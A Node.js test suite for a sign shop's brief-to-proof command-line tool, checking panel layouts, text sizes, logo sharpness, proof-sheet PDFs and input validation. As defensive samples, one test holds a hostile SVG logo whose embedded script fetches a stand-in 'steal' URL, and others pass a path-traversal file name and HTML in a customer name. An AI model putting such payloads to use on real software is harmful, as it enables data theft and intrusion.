// Brief to proof pictures (scripts/proof-from-brief): the command line tool builds the proof bot's brief in the Designer
// itself and saves what the proof request would carry. Each test runs the real tool (Chromium, the real fonts) on a
// made-up order. The customers here are not real businesses.
import test, { after } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync, readdirSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { makePng, startServer, launch, newPage, openDesigner } from './helpers.mjs';
import { loadEnv } from '../unit/helpers.mjs';
import { checkBrief, loadData } from '../../scripts/proof-from-brief/brief.mjs';
import { validateDocument } from '../../../assets/design/model/document.js';

const CLI = fileURLToPath(new URL('../../scripts/proof-from-brief/cli.mjs', import.meta.url));
const EXAMPLES = fileURLToPath(new URL('../../scripts/proof-from-brief/examples/', import.meta.url));
const specs = JSON.parse(readFileSync(new URL('../../../assets/design/print-specs.json', import.meta.url), 'utf8'));
const env = loadEnv();
const data = loadData();

const work = mkdtempSync(join(tmpdir(), 'proof-from-brief-'));
after(() => rmSync(work, { recursive: true, force: true }));
let n = 0;

const MARK = readFileSync(EXAMPLES + 'honeydrop-logo.svg');
const palette = { primary: { name: 'Brown', hex: '#8B4513' }, accent: { name: 'Cream', hex: '#FFF8E7' }, ink: { name: 'Cream', hex: '#FFF8E7' } };
const brief = (over) => ({ status: 'ready', brief: { customer: 'Test Customer', proof_no: 1, date: '2026-11-10', palette, extra_colors: [], fields: { name: 'Oak Street Bakery', line2: 'Fresh Daily', phone: '', web: '' }, font: null, logos: [], notes: [], not_included: [], ...over } });

// Runs the tool. logos: {file name: Buffer}. Returns the exit code, the JSON the tool printed, the folder and the report.
function run(reply, { logos = {}, mockups = null, noSheet = false, strict = false, noLogosFlag = false, briefFile, outDir } = {}) {
  const dir = join(work, 'run-' + ++n);
  const logoDir = join(dir, 'logos');
  mkdirSync(logoDir, { recursive: true });
  for (const [file, bytes] of Object.entries(logos)) writeFileSync(join(logoDir, file), bytes);
  const file = briefFile || join(dir, 'reply.json');
  if (!briefFile) writeFileSync(file, JSON.stringify(reply));
  const out = outDir || join(dir, 'out');
  const mockupDir = join(dir, 'mockups');
  if (mockups) {
    mkdirSync(mockupDir, { recursive: true });
    for (const [name, bytes] of Object.entries(mockups)) writeFileSync(join(mockupDir, name), bytes);
  }
  const args = [CLI, '--brief', file, '--out', out, ...(noLogosFlag ? [] : ['--logos', logoDir]), ...(mockups ? ['--mockups', mockupDir] : []), ...(noSheet ? ['--no-sheet'] : []), ...(strict ? ['--strict'] : [])];
  const res = spawnSync(process.execPath, args, { encoding: 'utf8', timeout: 180000 });
  let result = null;
  try { result = JSON.parse(res.stdout); } catch (_) { /* leave null: the assertion below says what stderr had */ }
  const reportFile = join(out, 'report.json');
  return { code: res.status, result, out, stderr: res.stderr, report: existsSync(reportFile) ? JSON.parse(readFileSync(reportFile, 'utf8')) : null };
}

// width and height of a PNG file, from its header
function pngSize(path) {
  const b = readFileSync(path);
  assert.equal(b.slice(1, 4).toString('latin1'), 'PNG', path);
  return { w: b.readUInt32BE(16), h: b.readUInt32BE(20) };
}
const design = (out) => JSON.parse(readFileSync(join(out, 'design.json'), 'utf8'));
const textsOf = (side) => side.elements.filter((e) => e.type === 'text').map((e) => e.text);

test('the example brief becomes the whole flat and a picture of every panel, turned and checked the way the Designer does', () => {
  // the design's own checks, so no sheet here (the sheet's tests are below, and it has things to say: no mockup photo yet)
  const r = run(null, { briefFile: EXAMPLES + 'honeydrop-throw.json', logos: { 'honeydrop-logo.svg': MARK }, noSheet: true });
  assert.equal(r.code, 0, r.stderr);
  assert.equal(r.result.ok, true);
  assert.equal(r.result.verdict, 'clean');
  assert.deepEqual(r.result.checks, { safe_area: 'pass', min_text_size: 'pass', logo_sharpness: 'n/a', contrast: 'pass' });

  // the files, in the order the proof request carries them
  const names = ['flat', 'front', 'top', 'left-end', 'right-end', 'back'].map((s) => `preview-1-table-throw-${s}.png`);
  assert.deepEqual(readdirSync(join(r.out, 'previews')).sort(), names.slice().sort());
  assert.deepEqual(r.report.previews.map((p) => p.file), names.map((f) => 'previews/' + f));
  for (const f of ['design.json', 'brief.json', 'report.json', 'summary.txt']) assert.ok(existsSync(join(r.out, f)), f);

  // the design is a real v2 design the proof request would accept, with the brief's words and logo on the right panels
  const doc = design(r.out);
  assert.deepEqual(validateDocument(doc, env).errors, []);
  const piece = doc.project.pieces[0];
  assert.equal(piece.productId, 'throw');
  assert.deepEqual(piece.choices, { length: '6', style: '4' });
  assert.deepEqual(piece.sides.map((s) => s.name), ['Front', 'Top', 'Left end', 'Right end', 'Back']);
  assert.deepEqual(doc.project.palette, { primary: '#F6C445', accent: '#1F1A17', ink: '#1F1A17' });
  assert.deepEqual(textsOf(piece.sides[0]), ['HONEYDROP', 'APIARY'], 'the front is the template');
  assert.equal(piece.sides[1].elements.filter((e) => e.type === 'image' && e.logoId).length, 1, 'the logo is on top');
  for (const si of [2, 3, 4]) assert.deepEqual(textsOf(piece.sides[si]), ['HONEYDROP'], piece.sides[si].name);
  assert.equal(doc.project.logos[0].name, 'honeydrop-logo.svg');
  assert.equal(doc.project.logos[0].vector, true);

  // the pictures have the proportions of the printer's flat and of each panel as it reads on the table
  const flat = pngSize(join(r.out, 'previews', names[0]));
  assert.ok(Math.abs(flat.w / flat.h - (126.49 + 3) / (83.97 + 3)) < 0.01, `the flat has the cut shape's proportions: ${flat.w} x ${flat.h}`);
  const boxes = specs.products.throw.variants['6-4'].panels_in_template;
  for (const [i, id] of ['front', 'top', 'left', 'right'].entries()) {
    const box = boxes[id];
    const want = id === 'left' || id === 'right' ? { w: box.h, h: box.w } : { w: box.w, h: box.h };
    const got = pngSize(join(r.out, 'previews', names[i + 1]));
    assert.ok(Math.abs(got.w / got.h - want.w / want.h) < 0.01, `${id}: ${got.w} x ${got.h}`);
  }

  // what is on each panel, in the words of the proof email, with how it is turned for print
  const summary = readFileSync(join(r.out, 'summary.txt'), 'utf8');
  assert.match(summary, /Left end \(turned 90 degrees clockwise on the flat, so it reads top to bottom\): "HONEYDROP"/);
  assert.match(summary, /Right end \(turned 90 degrees counterclockwise on the flat/);
  assert.match(summary, /Back \(turned 180 degrees on the flat\): "HONEYDROP"/);
  assert.match(summary, /Top: logo/);

  // the sizes behind the checks are in the report, and nothing left the machine
  assert.ok(r.report.text_sizes.length >= 5 && r.report.text_sizes.every((t) => t.ok && t.cap_in >= t.min_cap_in));
  assert.equal(r.report.logos[0].level, 'vector');
  assert.deepEqual(r.report.blocked_requests, []);
  assert.deepEqual(r.report.page_problems, []);
});

test('a small raster logo is reported with its dpi, and --strict turns anything that needs a look into exit 4', () => {
  const reply = brief({
    fields: { name: 'Oak Street Bakery', line2: 'Fresh Daily', phone: '334-555-0177', web: '' }, logos: [{ file: 'small.png', vector: false }],
    pieces: [{ product: 'yard', options: { pack: '25', print: '1' }, qty: 1, template: 'split-field', sides_mode: 'same', panels: [{ side: 'Front', use: 'template' }] }],
  });
  const logos = { 'small.png': makePng(300, 300) };
  const loose = run(reply, { logos });
  assert.equal(loose.code, 0, loose.stderr);
  assert.equal(loose.report.checks.logo_sharpness, 'fail');
  const row = loose.report.logos[0];
  assert.equal(row.level, 'red');
  assert.equal(row.pixels_w, 300);
  assert.equal(row.vector, false);
  assert.ok(row.dpi < row.amber_min, `${row.dpi} dpi is below amber ${row.amber_min}`);
  assert.ok(loose.report.attention.some((a) => /small\.png is about \d+ dpi at [\d.]+ in wide/.test(a) && /too low to print well/.test(a)), loose.report.attention.join(' | '));
  // the template's logo frame took the real file
  const doc = design(loose.out);
  assert.equal(doc.project.pieces[0].sides[0].elements.filter((e) => e.type === 'image' && e.logoId === doc.project.logos[0].id).length, 1);
  assert.equal(doc.project.logos[0].vector, false);
  assert.equal(doc.project.logos[0].w, 300);
  assert.deepEqual(readdirSync(join(loose.out, 'previews')), ['preview-1-yard-sign-front.png']);

  const strict = run(reply, { logos, strict: true });
  assert.equal(strict.code, 4, 'a failed check is exit 4 with --strict');
  assert.equal(strict.result.ok, true, 'the files are still written');
  assert.ok(existsSync(join(strict.out, 'design.json')));
});

test('words too small for the panel are named with their size, and two lines beat one long one', () => {
  const reply = brief({
    fields: { name: 'BLUEBIRD ROOFING & RESTORATION', line2: '', phone: '', web: '' },
    pieces: [{ product: 'throw', options: { length: '6', style: '3' }, qty: 1, template: 'bold-center', sides_mode: 'each', panels: [
      { side: 'Front', use: 'template' }, { side: 'Top', use: 'plain' },
      { side: 'Left end', use: 'text', lines: ['BLUEBIRD ROOFING & RESTORATION'] },
      { side: 'Right end', use: 'text', lines: ['BLUEBIRD ROOFING', '& RESTORATION'] },
    ] }],
  });
  const r = run(reply);
  assert.equal(r.code, 0, r.stderr);
  assert.equal(r.report.checks.min_text_size, 'fail');
  const left = r.report.text_sizes.filter((t) => t.panel === 'Left end');
  const right = r.report.text_sizes.filter((t) => t.panel === 'Right end');
  assert.equal(left.length, 1);
  assert.equal(right.length, 2);
  assert.equal(left[0].ok, false);
  assert.ok(left[0].cap_in < left[0].min_cap_in);
  assert.equal(left[0].min_cap_in, 2, 'the throw\'s minimum letter height');
  assert.ok(Math.min(...right.map((t) => t.cap_in)) > left[0].cap_in, 'splitting the name onto two lines makes every line bigger');
  assert.ok(r.report.attention.some((a) => a.startsWith('Left end: ') && /only [\d.]+ in tall/.test(a) && /Hard to read from 20 ft/.test(a)), r.report.attention.join(' | '));
  // a 3-sided throw: the flat and four panels, and the back strip is not a panel
  assert.equal(r.report.previews.length, 5);
  assert.ok(!r.report.previews.some((p) => /back/.test(p.file)));

  // pictures left in the folder by an earlier, bigger run are cleared, so the folder is only this run
  const first = run(null, { briefFile: EXAMPLES + 'honeydrop-throw.json', logos: { 'honeydrop-logo.svg': MARK } });
  assert.equal(readdirSync(join(first.out, 'previews')).length, 6);
  const again = run(reply, { outDir: first.out });
  assert.equal(again.code, 0, again.stderr);
  assert.equal(readdirSync(join(first.out, 'previews')).length, 5);
  assert.ok(!existsSync(join(first.out, 'previews', 'preview-1-table-throw-back.png')));
});

test('logo and words together, a panel with its own background, a font for every word, and a panel left for a person', () => {
  const reply = brief({
    fields: { name: 'OAK STREET', line2: 'BAKERY', phone: '334-555-0177', web: 'oakstreet.example' }, font: 'oswald', logos: [{ file: 'mark.svg', vector: true }],
    pieces: [{ product: 'throw', options: { length: '8', style: '4' }, qty: 1, template: 'split-field', sides_mode: 'each', panels: [
      { side: 'Front', use: 'template' },
      { side: 'Top', use: 'logo' },
      { side: 'Left end', use: 'logo_and_text', lines: ['OAK STREET'] },
      { side: 'Right end', use: 'custom', note: 'Tagline on a curve' },
      { side: 'Back', use: 'logo_and_text', lines: ['OAK STREET BAKERY'], bg: 'accent' },
    ] }],
  });
  const r = run(reply, { logos: { 'mark.svg': MARK } });
  assert.equal(r.code, 0, r.stderr);
  const doc = design(r.out);
  assert.deepEqual(validateDocument(doc, env).errors, []);
  const [front, top, left, right, back] = doc.project.pieces[0].sides;
  const img = (side) => side.elements.filter((e) => e.type === 'image' && e.logoId);
  const txt = (side) => side.elements.filter((e) => e.type === 'text');
  assert.equal(img(front).length, 1, 'the template\'s logo frame took the logo');
  assert.equal(img(top).length, 1);
  // a squarer panel stacks the logo over the words, a wide one puts them side by side
  assert.equal(img(left).length, 1);
  assert.deepEqual(txt(left).map((t) => t.text), ['OAK STREET']);
  assert.ok(img(left)[0].y + img(left)[0].h <= txt(left)[0].y + 0.01, 'on the end the logo is above the words');
  assert.equal(img(back).length, 1);
  assert.ok(img(back)[0].x + img(back)[0].w <= txt(back)[0].x + 0.01, 'on the wide back the logo is left of the words');
  // the back has its own background, and the words use the palette color that reads on it (not the ink, which is that color)
  assert.deepEqual(back.bg, { type: 'solid', color: '@accent' });
  assert.equal(back.bgOwn, true);
  assert.ok(txt(back).every((t) => t.fill === '@primary'), JSON.stringify(txt(back).map((t) => t.fill)));
  assert.equal(r.report.checks.contrast, 'pass');
  // one font on every word of the design, front included
  const fonts = new Set(doc.project.pieces[0].sides.flatMap((s) => txt(s).map((t) => t.font)));
  assert.deepEqual([...fonts], ['oswald']);
  // the custom panel is plain, and listed for a person
  assert.equal(right.elements.length, 0);
  assert.deepEqual(r.report.manual, [{ piece: 0, panel: 'Right end', note: 'Tagline on a curve' }]);
  assert.ok(r.report.attention.includes('Right end: needs a manual layout (Tagline on a curve). It is plain in these pictures.'), r.report.attention.join(' | '));
  // a phone and a website the panels do not print are called out
  assert.deepEqual(r.report.unplaced_fields.map((f) => f.field).sort(), ['phone', 'web']);
  assert.ok(r.report.attention.includes('The web "oakstreet.example" is not printed on any panel.'));
  assert.equal(r.report.previews.length, 6);
});

const exampleReply = () => JSON.parse(readFileSync(EXAMPLES + 'honeydrop-throw.json', 'utf8'));
const hasPdftotext = spawnSync('pdftotext', ['-v'], { encoding: 'utf8' }).error == null;

test('the proof sheet is a 17 x 11 in page, a PNG at 200 dpi and a PDF with real text, with the reference proof\'s parts', () => {
  const reply = exampleReply();
  reply.brief.customer = 'Honeydrop <b>Apiary</b>';
  reply.brief.pieces[0].mockup_file = 'photo.png';
  const r = run(reply, { logos: { 'honeydrop-logo.svg': MARK }, mockups: { 'photo.png': makePng(900, 600) } });
  assert.equal(r.code, 0, r.stderr);
  assert.equal(r.report.sheets.length, 1);
  const sheet = r.report.sheets[0];
  assert.equal(sheet.png, 'proof-sheet-1-table-throw.png');
  assert.equal(sheet.pdf, 'proof-sheet-1-table-throw.pdf');
  assert.deepEqual([sheet.width, sheet.height], [3400, 2200], '17 x 11 in at 200 dpi');
  assert.deepEqual(pngSize(join(r.out, sheet.png)), { w: 3400, h: 2200 });
  assert.ok(readFileSync(join(r.out, sheet.png)).length > 100000, 'a page with art on it, not a blank one');
  assert.ok(r.result.files.includes(sheet.png) && r.result.files.includes(sheet.pdf));

  // the PDF is one page of 17 x 11 in (1224 x 792 points)
  const pdf = readFileSync(join(r.out, sheet.pdf)).toString('latin1');
  assert.ok(pdf.startsWith('%PDF'));
  assert.ok(/\/MediaBox\s*\[\s*0 0 1224 792\s*\]/.test(pdf), 'a 17 x 11 in page');
  assert.equal((pdf.match(/\/Type\s*\/Page[^s]/g) || []).length, 1);

  // the page's words: the reference proof's lines, this proof's numbers, and the customer's name as plain text
  const lines = [
    'Get Seen Signs - Proof for Honeydrop <b>Apiary</b>', '6 ft 4-sided table throw | Proof 1 | Nov 8, 2026', 'GET SEEN SIGNS', '6 ft 4-sided table throw (Qty 1)',
    'How it looks set up', 'Mockup for feel only. The flat art is what prints.', 'COLORS', 'NOTES',
    'Colors on screen may vary slightly from print. Please review spelling and layout.', 'Proof 1 of up to 3 free revisions. Reply "Approved" or send any changes.',
    'Honey gold (background) #F6C445', 'Charcoal (bars and blocks, text) #1F1A17',
    'Logo is the customer\'s file, honeydrop-logo.svg, placed as is, not redrawn.',
    'Side and back art is turned on the flat so it reads right side up when the cover hangs.', 'Hatched corners wrap the table corners and carry no art.',
    'Panels as they read on the table: Front 72.66 x 27.65 in | Top 72.66 x 28.51 in | Left end 28.51 x 26.95 in | Right end 28.51 x 26.88 in | Back 72.66 x 27.81 in',
    'Flat page 127.51 x 85.01 in | To scale', 'FRONT', 'TOP', 'LEFT END', 'RIGHT END', 'BACK', 'CORNER DRAPE',
  ];
  const flat = (t) => t.replace(/\s+/g, ' ');
  for (const line of lines) assert.ok(flat(sheet.text).includes(flat(line)), `the page says "${line}"`);
  assert.equal(sheet.mockup, true);
  assert.equal(flat(sheet.text).includes('Mockup photo not added yet'), false);
  assert.deepEqual(sheet.overflow, [], 'everything fits');
  assert.ok(!r.report.attention.some((a) => /no mockup photo/.test(a)), r.report.attention.join(' | '));
  if (hasPdftotext) {
    const text = flat(spawnSync('pdftotext', ['-layout', join(r.out, sheet.pdf), '-'], { encoding: 'utf8' }).stdout);
    for (const line of lines.slice(0, 12)) assert.ok(text.includes(flat(line)), `the PDF text has "${line}"`);
  }
  assert.deepEqual(r.report.blocked_requests, []);
  assert.deepEqual(r.report.page_problems, []);
});

test('without a mockup photo the box is plainly empty and the report says so; --no-sheet makes no sheet', () => {
  const none = run(exampleReply(), { logos: { 'honeydrop-logo.svg': MARK } });
  assert.equal(none.code, 0, none.stderr);
  const sheet = none.report.sheets[0];
  assert.equal(sheet.mockup, false);
  assert.ok(sheet.text.includes('Mockup photo not added yet'));
  assert.ok(none.report.attention.some((a) => /Proof sheet 1: no mockup photo/.test(a)), none.report.attention.join(' | '));
  assert.equal(none.report.verdict, 'needs_attention');
  // the example brief's own note still hands a question to Scott, and the tool says that before it goes out
  assert.ok(none.report.attention.some((a) => /Proof sheet 1: a note still has a question in it \("Print method: Scott to confirm\."\)/.test(a)), none.report.attention.join(' | '));

  const off = run(exampleReply(), { logos: { 'honeydrop-logo.svg': MARK }, noSheet: true });
  assert.equal(off.code, 0, off.stderr);
  assert.deepEqual(off.report.sheets, []);
  assert.deepEqual(readdirSync(off.out).filter((f) => /^proof-sheet/.test(f)), []);
  assert.ok(!off.report.attention.some((a) => /Proof sheet/.test(a)));
  assert.equal(readdirSync(join(off.out, 'previews')).length, 6, 'the pictures are still made');
});

test('a mockup the brief names has to be in the mockups folder', () => {
  const reply = exampleReply();
  reply.brief.pieces[0].mockup_file = 'photo.png';
  const noFlag = run(reply, { logos: { 'honeydrop-logo.svg': MARK } });
  assert.equal(noFlag.code, 1);
  assert.match(noFlag.result.errors[0].message, /--mockups/);
  const gone = run(reply, { logos: { 'honeydrop-logo.svg': MARK }, mockups: { 'other.png': makePng(10, 10) } });
  assert.equal(gone.code, 1);
  assert.match(gone.result.errors[0].message, /photo\.png is not in/);
  // not a photo at all: refused with the path, before any browser starts
  reply.brief.pieces[0].mockup_file = '../photo.png';
  const bad = run(reply, { logos: { 'honeydrop-logo.svg': MARK } });
  assert.equal(bad.code, 1);
  assert.equal(bad.result.errors[0].path, 'pieces[0].mockup_file');
});

test('two pieces make one design with a flat or a picture per side for each, and a hostile logo cannot make the tool call out', () => {
  const evil = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 100"><style>@import url(https://example.invalid/x.css);</style><image xlink:href="https://example.invalid/pixel.png" width="10" height="10"/><circle cx="50" cy="50" r="40" fill="#8B4513"/><script>fetch("https://example.invalid/steal")</script></svg>');
  const reply = brief({
    logos: [{ file: 'evil.svg', vector: true }],
    pieces: [
      { product: 'canopy', options: { package: 'valance' }, qty: 2, template: 'split-field', sides_mode: 'each', panels: [{ side: 'Front', use: 'template' }, { side: 'Right', use: 'text', lines: ['FRESH DAILY'] }, { side: 'Back', use: 'logo' }, { side: 'Left', use: 'plain' }] },
      { product: 'feather', options: { height: '14', base: 'spike' }, qty: 1, template: 'badge-star', sides_mode: 'same', panels: [{ side: 'Flag', use: 'template' }] },
    ],
  });
  const r = run(reply, { logos: { 'evil.svg': evil } });
  assert.equal(r.code, 0, r.stderr);
  assert.deepEqual(readdirSync(join(r.out, 'previews')).sort(), [
    'preview-1-canopy-tent-back.png', 'preview-1-canopy-tent-front.png', 'preview-1-canopy-tent-left.png', 'preview-1-canopy-tent-right.png', 'preview-2-feather-flag-flag.png',
  ]);
  const doc = design(r.out);
  assert.deepEqual(validateDocument(doc, env).errors, []);
  assert.deepEqual(doc.project.pieces.map((p) => [p.productId, p.qty, p.sidesMode]), [['canopy', 2, 'each'], ['feather', 1, 'same']]);
  assert.deepEqual(textsOf(doc.project.pieces[0].sides[1]), ['FRESH DAILY']);
  assert.equal(doc.project.pieces[0].sides[2].elements.filter((e) => e.type === 'image' && e.logoId).length, 1);
  assert.equal(doc.project.pieces[0].sides[3].elements.length, 0, 'a plain side has only its background');
  // the feather flag's template put the logo in its seal
  assert.equal(doc.project.pieces[1].sides[0].elements.filter((e) => e.type === 'image' && e.logoId).length, 1);
  assert.equal(r.report.pieces.length, 2);
  assert.deepEqual(r.report.sheets.map((x) => [x.png, x.width, x.height]), [['proof-sheet-1-canopy-tent.png', 3400, 2200], ['proof-sheet-2-feather-flag.png', 3400, 2200]], 'a sheet for each piece');
  assert.ok(r.report.sheets[0].text.includes('FRONT') && r.report.sheets[0].text.includes('RIGHT') && r.report.sheets[0].text.includes('BACK') && r.report.sheets[0].text.includes('LEFT'), 'every side of the canopy is drawn');
  assert.ok(r.report.sheets[1].text.includes('CLOSE-UP') && r.report.sheets[1].text.includes('POLE SIDE'), 'the flag has its close-ups and its pole side');
  // words on a canopy side go in the gable's own block, inside the safe line
  assert.ok(!r.report.warnings.some((w) => w.panel === 'Right' || w.panel === 'Back'), JSON.stringify(r.report.warnings));
  // the SVG was cleaned like any customer upload, and nothing was fetched from outside or from /api
  assert.deepEqual(r.report.blocked_requests, []);
  assert.deepEqual(r.report.page_problems, []);
});

test('a brief with mistakes is refused with every path named, before any browser starts', () => {
  const bad = { status: 'ready', brief: { customer: '', palette: { primary: { hex: 'red' } }, fields: { name: 'x' }, pieces: [{ product: 'sign', options: {}, panels: [] }] } };
  const r = run(bad);
  assert.equal(r.code, 1);
  assert.equal(r.result.ok, false);
  assert.equal(r.result.stage, 'brief');
  const where = r.result.errors.map((e) => e.path);
  for (const p of ['customer', 'palette.primary.hex', 'palette.accent', 'pieces[0].product']) assert.ok(where.includes(p), `${p} in ${where}`);
  assert.equal(existsSync(join(r.out, 'previews')), false, 'nothing is written for a bad brief');
  assert.match(r.stderr, /brief: palette\.primary\.hex: /);
});

test('a reply that is not ready is not rendered (exit 2), and logo files are looked for in the folder', () => {
  const r = run({ status: 'need_info', summary: 'x', questions: ['Which style?'], flags: [], checks: {}, brief: null });
  assert.equal(r.code, 2);
  assert.equal(r.result.status, 'need_info');
  assert.equal(r.result.errors[0].path, 'status');

  const one = brief({ logos: [{ file: 'missing.svg', vector: true }], pieces: [{ product: 'throw', options: { length: '6', style: '4' }, qty: 1, template: 'bold-center', sides_mode: 'each', panels: [{ side: 'Front', use: 'template' }, { side: 'Top', use: 'logo' }, { side: 'Left end', use: 'plain' }, { side: 'Right end', use: 'plain' }, { side: 'Back', use: 'plain' }] }] });
  const gone = run(one);
  assert.equal(gone.code, 1);
  assert.equal(gone.result.stage, 'logos');
  assert.match(gone.result.errors[0].message, /missing\.svg is not in/);
  const noFlag = run(one, { noLogosFlag: true });
  assert.equal(noFlag.code, 1);
  assert.match(noFlag.result.errors[0].message, /--logos/);
});

test('every product with every template builds into a design the proof request accepts, with its pictures', async () => {
  const server = await startServer();
  const browser = await launch();
  try {
    const { page, problems } = await newPage(browser, 'desktop');
    await openDesigner(page, server.base, '/design/yard-signs/');
    const logos = [{ file: 'mark.svg', type: 'image/svg+xml', base64: MARK.toString('base64') }];
    const failures = [];
    let runs = 0;
    const attempt = async (label, piece) => {
      const checked = checkBrief(brief({ logos: [{ file: 'mark.svg', vector: true }], fields: { name: 'TESTCO', line2: 'WORKS', phone: '334-555-0100', web: 'testco.example' }, pieces: [piece] }), data);
      if (!checked.ok) return failures.push(`${label}: brief ${JSON.stringify(checked.errors)}`);
      try {
        const got = await page.evaluate(async ({ b, l }) => {
          const r = await (await import('/.design-dev/scripts/proof-from-brief/in-page.mjs')).run(b, l);
          return { valid: r.report.doc_valid, previews: r.previews.map((p) => [p.file, p.base64.length]), sides: r.doc.project.pieces[0].sides.length, sheets: r.sheets.map((sh) => sh.hero.figures.map((f) => f.svg.length)) };
        }, { b: checked.brief, l: logos });
        runs++;
        if (!got.valid.ok) failures.push(`${label}: invalid design ${got.valid.errors}`);
        if (!got.previews.length || got.previews.some(([, size]) => size < 1000)) failures.push(`${label}: pictures ${JSON.stringify(got.previews)}`);
        // and the proof sheet's art: at least one figure, each a real drawing
        if (got.sheets.length !== 1 || !got.sheets[0].length || got.sheets[0].some((size) => size < 300)) failures.push(`${label}: sheet figures ${JSON.stringify(got.sheets)}`);
      } catch (e) {
        failures.push(`${label}: ${e.message}`);
      }
    };
    const USES = ['logo_and_text', 'text', 'logo', 'plain'];
    for (const product of data.catalog.products) {
      const options = Object.fromEntries(product.groups.map((g) => [g.id, g.choices[0].id]));
      const names = product.sides.mode === 'by_choice' ? product.sides.names[options[product.sides.group]] : product.sides.names;
      const panelled = !!product.sides.panels;
      const many = names.length > 1;
      for (const template of product.templates) {
        const panels = names.map((side, i) => (i === 0 ? { side, use: 'template' } : { side, use: USES[(i - 1) % USES.length], ...((USES[(i - 1) % USES.length]).includes('text') ? { lines: ['TESTCO'] } : {}) }));
        await attempt(`${product.id} ${template}`, { product: product.id, options, qty: 1, template, sides_mode: panelled || many ? 'each' : 'same', panels: many ? panels : [panels[0]] });
      }
      // a one-sided product also takes a logo with words, and a canopy or a flag takes its special places
      if (!many) await attempt(`${product.id} logo and text`, { product: product.id, options, qty: 1, template: product.templates[0], sides_mode: 'same', panels: [{ side: names[0], use: 'logo_and_text', lines: ['TESTCO', 'WORKS'] }] });
    }
    assert.deepEqual(failures, []);
    assert.ok(runs >= 40, `${runs} builds`);
    assert.deepEqual(problems.filter((p) => !/swiftshader|GPU stall|GL Driver/i.test(p)), []);
  } finally {
    await browser.close();
    server.stop();
  }
});
